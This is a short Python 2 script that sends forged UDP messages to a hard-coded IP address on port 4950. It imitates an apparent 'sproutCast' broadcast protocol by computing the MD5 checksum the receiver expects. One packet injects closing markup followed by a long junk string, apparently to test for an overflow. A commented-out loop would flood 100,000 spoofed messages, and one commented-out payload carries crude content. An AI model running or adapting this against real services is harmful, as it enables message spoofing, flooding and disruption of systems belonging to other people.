import socket, sys, struct, time, md5

hostname = '69.120.198.193'
port = 4950
#msg = "5a0006c02db09b6cf269d50c7f39bb23^what^120209^0^<sproutCast><title>dump on your face</title></sproutCast>"
host = socket.gethostbyname(hostname)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)	

'''
for x in xrange(100000):
	m = md5.new()
	tempMessage = "what^120511^"+ str(x) + "^0^fsa</body></sproutcast><sproutcast><url>http://www.google.com</url><body>Plastic piecies of"
	m.update(tempMessage)
	msg1 = str(m.hexdigest()) + "^" + tempMessage
	msg = "oaV91WsI" + msg1
	print msg
	time.sleep(.05)
	s.sendto(msg,(host,port))


'''

m = md5.new()
tempMessage = "what^120511^55^0^fsa</body>AnotherPacketAnotherPacketAnotherPaAnotherPacherPacketAnothcketAnotherPacketAnotherPacketcketAnotherPacketAnotherPacketcketAnothertherPacketAnotherPacketAnotherPacketAnothcketAnotherPacketAnotherPacketcketAnotherPacketAnotherPacketcketAnotherPacketAnotherPacketcketAnotherPacketAnotherPacketerPacketPacketAnotherPacketcketAnotherPacketAnotherPacketerPacketcketAnotherPacketAnotherPacketAnotherPacketAnotherPacketAnothcketAnotherPacketAnotherPacketcketAnotherPacketAnotherPacketcketAnothertherPacketAnotherPacketAnotherPacketAnothcketAnotherPacketAnotherPacketcketAnotherPacketAnotherPacketcketAnotherPacketAnotherPacketcketAnotherPacketAnotherPacketerPacketPacketAnotherPacketcketAnotherPacketAnotherPacketerPacketJONDROSDECKHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHEHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOHELLOCRACKERJAdfadflkajdlfgkjaldkgjalskdjgfladfadsfafadsfasdfasdfasdfasdfasdf;kjasdflkjaslkgjalsdkgalkdga;lsdkja;lksdjfl;aksjdf;laksadsflkajsdflkajsdflkajsdl;kfjasd;lfkjal;dkfjl;askjf;laksjasdjflkasjfkajsdlfkjasdl;fkjalsdkfjl;aksdjfsd;lfkas;dkf;aslkdfkasjdf;lkasjdf;lkasddddddddflkjdf;lkddddddddddajdflajsddddddl;fkjasdl;kjjdfl;kasjdflkajsdf;lkjasdfasdfasdfasdfafasdfasdfadsfasdfasdfasdfasdfadsfadsfasdfasdfadsfasdf,amdf/.,amsdf/.,amsdf/.,asmdskdjflkasdjflkasjdflajsdfljasldkfalskdjfLLOHELLOHELLOHELLO"
m.update(tempMessage)
msg = str(m.hexdigest()) + "^" + tempMessage
print msg
time.sleep(.05)
s.sendto(msg,(host,port))
